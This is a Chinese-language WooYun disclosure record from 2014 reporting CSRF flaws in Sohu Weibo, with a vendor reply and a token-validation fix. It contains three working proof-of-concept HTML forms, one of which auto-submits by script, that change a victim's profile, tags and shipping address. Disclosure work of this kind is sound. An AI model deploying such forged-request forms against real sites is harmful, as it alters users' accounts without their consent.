{"id": 58443, "wybug_id": "wooyun-2014-051233", "wybug_title": "搜狐微博CSRF漏洞", "wybug_corp": "搜狐", "wybug_author": "大亮", "wybug_date": "2014-02-18 16:38", "wybug_open_date": "2014-04-04 16:38", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向公众公开  简要描述： 搜狐微博的csrf漏洞，不知道能有多少rank呢，求礼物啊 详细说明：  No.1 昵称和个人资料基本资料被修改CSRF。\n<script>\tfunction randomUName(){\t\tvar uname=document.createElement(\"input\");\t\tuname.type=\"hidden\";\t\tuname.name=\"username\";\t\tvar nameValue=encodeURIComponent((\"卧室SB\"+Math.random()*1000000000).substr(0,10)+\"号\");\t\tuname.value=nameValue;\t\tdocument.getElementById(\"modifyInfo\").appendChild(uname);\t\tdocument.getElementById(\"modifyInfo\").submit();\t}  </script>  <form action=\"http://t.sohu.com/settings/base/set\" method=\"POST\" id=\"modifyInfo\">      <input type=\"hidden\" name=\"sex\" value=\"1\" />      <input type=\"hidden\" name=\"schoolid\" value=\"0\" />      <input type=\"hidden\" name=\"areaid\" value=\"0\" />      <input type=\"hidden\" name=\"email\" value=\"daliang987&#64;126&#46;com\" />      <input type=\"hidden\" name=\"description\" value=\"just for fun!&#37;E4&#37;BD&#37;A0&#37;E7&#37;9A&#37;84&#37;E8&#37;B5&#37;84&#37;E6&#37;96&#37;99&#37;E8&#37;A2&#37;AB&#37;E6&#37;94&#37;B9&#37;E5&#37;86&#37;99&#37;E4&#37;BA&#37;86&#37;EF&#37;BC&#37;81&#37;E5&#37;91&#37;B5&#37;E5&#37;91&#37;B5&#37;E5&#37;91&#37;B5\" />      <input type=\"hidden\" name=\"year\" value=\"1989\" />      <input type=\"hidden\" name=\"month\" value=\"11\" />      <input type=\"hidden\" name=\"day\" value=\"25\" />      <input type=\"hidden\" name=\"country\" value=\"\" />      <input type=\"hidden\" name=\"realName\" value=\"\" />      <input type=\"hidden\" name=\"cardType\" value=\"1\" />      <input type=\"hidden\" name=\"cardId\" value=\"\" />      <input type=\"hidden\" name=\"proc\" value=\"1\" />      <input type=\"hidden\" name=\"city\" value=\"5\" />    </form>\n证明：\n\n谁点谁知道。。。\n\nNo.2 标签修改CSRF\n<html>  <!-- CSRF PoC - generated by burp suite professional -->  <body>    <form action=\"http://t.sohu.com/settings/tag/addTag\" method=\"POST\">      <input type=\"hidden\" name=\"tagname\" value=\"adm1nSB\" />      <input type=\"hidden\" name=\"tagtype\" value=\"0\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body></html>\n证明：\n\n\n\nNo.3 收货地址CSRF\n<body>    <form action=\"http://t.sohu.com/settings/address/set\" method=\"POST\">      <input type=\"hidden\" name=\"contactInfoRealName\" value=\"&#37;E7&#37;8E&#37;8B&#37;E5&#37;B0&#37;BC&#37;E7&#37;8E&#37;9B\" />      <input type=\"hidden\" name=\"contactInfoMobile\" value=\"18622221111\" />      <input type=\"hidden\" name=\"contactInfoProvince\" value=\"1\" />      <input type=\"hidden\" name=\"contactInfoCity\" value=\"1\" />      <input type=\"hidden\" name=\"contactInfoAddress\" value=\"&#37;E4&#37;B8&#37;8D&#37;E7&#37;9F&#37;A5&#37;E9&#37;81&#37;93&#37;E5&#37;95&#37;8A\" />      <input type=\"hidden\" name=\"contactInfoZipCode\" value=\"101000\" />      <input type=\"submit\" value=\"Submit form\" />    </form>  </body>\n\n\n\n\n   漏洞证明：  以上主要就是针对资料修改的一些csrf，求礼物啊   修复方案：  token验证   版权声明：转载请注明来源 大亮@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-02-18 17:02 厂商回复： 感谢对搜狐安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-21 12:20 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  \"卧室SB\"  大亮    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}